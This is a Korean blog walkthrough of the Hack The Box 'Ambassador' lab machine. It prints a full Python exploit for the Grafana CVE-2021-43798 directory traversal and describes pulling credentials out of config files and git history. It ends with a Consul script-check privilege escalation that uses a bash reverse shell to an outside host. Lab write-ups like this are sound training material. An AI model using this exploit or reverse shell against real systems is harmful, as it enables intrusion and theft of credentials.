---
title: "[Hack The Box] Ambassador 풀이"
categories:
  - Hack-The-Box
tags:
  - HTB
  - Hack The Box
  - Ambassador
toc: true
toc_sticky: true
toc_label: "Ambassador 풀이"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/hackthebox.jpeg
---

💡 Hack-The-Box Ambassador 풀이 입니다.
{: .notice--warning}

# 문제

![image](https://user-images.githubusercontent.com/33647663/218292595-43a4558b-daf7-4bbe-9995-635eb99b4c32.png)

# Enumeration

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sV -p - -vv --min-rate 3000 10.129.228.56                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 00:01 EST
NSE: Loaded 45 scripts for scanning.
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?    syn-ack
3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
```

22,80,3000,3306 번 포트가 열려있습니다. 


# HTTP

![image](https://user-images.githubusercontent.com/33647663/218294039-a82de04c-1fe9-4df9-b697-111c3c310fd5.png)

특별하게 살펴볼 지점이 없기 때문에 subdirectory listing을 수행합니다.

![image](https://user-images.githubusercontent.com/33647663/218293887-d8f45dfb-289c-408d-8071-811e9e554f1c.png)

subdirectory도 특별하게 살펴볼 지점이 없습니다. 

3000번 포트로 접속을 해봅니다. Grafana라는 서비스가 나옵니다. 

![image](https://user-images.githubusercontent.com/33647663/218294099-24198b94-1214-4b50-b4a6-96edbbc5e2fa.png)


# Searchsploit
하단에 버전 정보가 존재하기 때문에 관련 익스플로잇이 존재하는지 찾아봅니다.

```bash
searchsploit grafana
```


![image](https://user-images.githubusercontent.com/33647663/218294128-0d0543d6-9c19-426a-82fd-aae45129b169.png)

```Directory Traversal and Arbitary File Read``` 가 가능한 exploit 코드가 존재합니다. 

해당 익스플로잇을 다운받은 뒤 코드를 살펴보면 다음과 같습니다.

```py
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    .. 생략
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
```

익스플로잇 코드 자체는 간단합니다. 여러 plugin_list 중에서 하나를 선택한다음 다음과 같이 경로 접근을 시도하면 원하는 파일을 읽을 수 있는 취약점입니다.

```py
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```

해당 코드를 실행하여 /etc/passwd를 읽어봅니다.

![image](https://user-images.githubusercontent.com/33647663/218294245-663ef393-374b-42df-bbc3-4612cb802c0a.png)

익스플로잇 코드가 동작합니다. 

이제는 어떠한 파일을 읽을지 고민을 해야 합니다. 

현재 실행되고 있는 서비스(grafana)의 실행파일을 먼저 읽어 봅니다.
실행파일의 경로는 /etc/grafana/grafana.ini 입니다.

설정파일안에 admin 계정의 정보가 노출되어 있습니다.

![image](https://user-images.githubusercontent.com/33647663/218294319-75d5a067-b9a4-4413-a14f-78ae3d334edc.png)

```py
id : admin
password : messageInABottle685427
```


![image](https://user-images.githubusercontent.com/33647663/218294392-ea226684-2f3d-481a-9b15-222931f17efc.png)

대시보드를 조금 살펴보면 다음과 같이 mysql 데이터베이스를 사용한다는 것을 알 수 있습니다.

![image](https://user-images.githubusercontent.com/33647663/218294825-94fb6f45-aabe-46bf-b516-ef74daed1171.png)


![image](https://user-images.githubusercontent.com/33647663/218294839-e07623b0-1d51-481f-8320-09ad3516a2d8.png)

grafana 문서를 보면, 설정파일들을 ```provisioning/datasources/``` 경로 아래에 저장합니다. 

![image](https://user-images.githubusercontent.com/33647663/218294810-ebb3beeb-7774-4268-bd1e-fc0df5be317c.png)

따라서 mysql.yaml 파일을 읽어낼 수 있습니다.


# Mysql

```
user : grafana
password : dontStandSoCloseToMe63221!
```

![image](https://user-images.githubusercontent.com/33647663/218294946-cfc9eabd-d846-41a5-a081-ec423c30cffd.png)

다음과 같은 사용자 데이터가 존재합니다.

![image](https://user-images.githubusercontent.com/33647663/218294993-a9eab2ce-998b-4393-b050-2948ed3a17c4.png)

비밀번호가 base64 인코딩 되어 있는것으로 보여 디코딩을 해봅니다.

![image](https://user-images.githubusercontent.com/33647663/218295017-7e986b38-78bb-42b2-acb8-a1b469737273.png)

```
id : developer
password : anEnglishManInNewYork027468
```


![image](https://user-images.githubusercontent.com/33647663/218295050-58ccf93b-1584-4692-984e-d4d717c5872f.png)


# Privilege Escalation

developer 계정에서 파일을 확인해보면 ```.gitconfig```파일이 존재합니다.

![image](https://user-images.githubusercontent.com/33647663/218295262-75418971-cd4a-425a-9e7c-2618b8c33bb8.png)

```/opt/my-app```폴더에서 깃을 이용한 작업을 한것으로 보이기 때문에 확인을 합니다


![image](https://user-images.githubusercontent.com/33647663/218295291-a491b984-1923-4809-aa6b-75e637eb62df.png)

변경 사항을 확인합니다.

![image](https://user-images.githubusercontent.com/33647663/218296066-7131803e-aada-4770-893a-135f15c138a4.png)

```py
consul token : bb03b43b-1d81-d62b-24b5-39540ee469b5
```

```sh
# token 정보없이 consul을 사용할 수 없다.
developer@ambassador:/opt/my-app/whackywidget$ consul kv put a b
Error! Failed writing data: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'key:write' on "a")
# token 정보를 같이 주면 권한이 허용된다.
developer@ambassador:/opt/my-app/whackywidget$ consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 test a
Success! Data written to: test
```

```sh
# 다음처럼 환경변수로 등록해두고 토큰을 사용한다.
developer@ambassador:/opt/my-app/whackywidget$ export TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5

developer@ambassador:/opt/my-app/whackywidget$ consul kv get --token $TOKEN test
a
```

consul의 실행 권한 및 설정 파일을 확인해 봅니다.

![image](https://user-images.githubusercontent.com/33647663/218296923-1a381d39-3f5d-412b-a530-356e34eeb8c6.png)

우선 프로세스는 root 권한으로 실행되고 있습니다.


consul의 설정파일인 /etc/consul.d/consul.hcl 파일중 하단의 설정은 다음과 같습니다.

![image](https://user-images.githubusercontent.com/33647663/218296893-e695ffde-2e04-4ad8-abe9-9309f54896b3.png)


```enable_script_checkst = ture``` 설정은 ```/etc/consul.d/config.d/``` 경로에 있는 다른 스크립트 파일들을 자동으로 실행시킨다는 옵션입니다. 

따라서 해당 경로에 exploit 코드를 작성하고 consul 프로세스를 재시작 할 수 있다면, root 권한을 획득할 수 있습니다.

해당 파일은 json 형태로 작성하여 ```exploit.json```파일로 저장하였습니다.

```json
{
  "check":{
    "name":"exploit",
    "args" : ["/usr/bin/bash","/tmp/shell.sh"],
    "interval" : "30s"
  }
}
```

```/tmp/shell.sh```는 다음과 같이 작성한뒤, ```consul reload --toekn $TOKEN```을 입력하여 consul을 재시작 합니다.

```bash
bash -i >& /dev/tcp/10.10.14.28/4444 0>&1
```

reverse shell을 획득하여 root flag를 얻을 수 있습니다.

![image](https://user-images.githubusercontent.com/33647663/218626943-e724e42e-9af5-412d-be31-ac66dd621ea3.png)
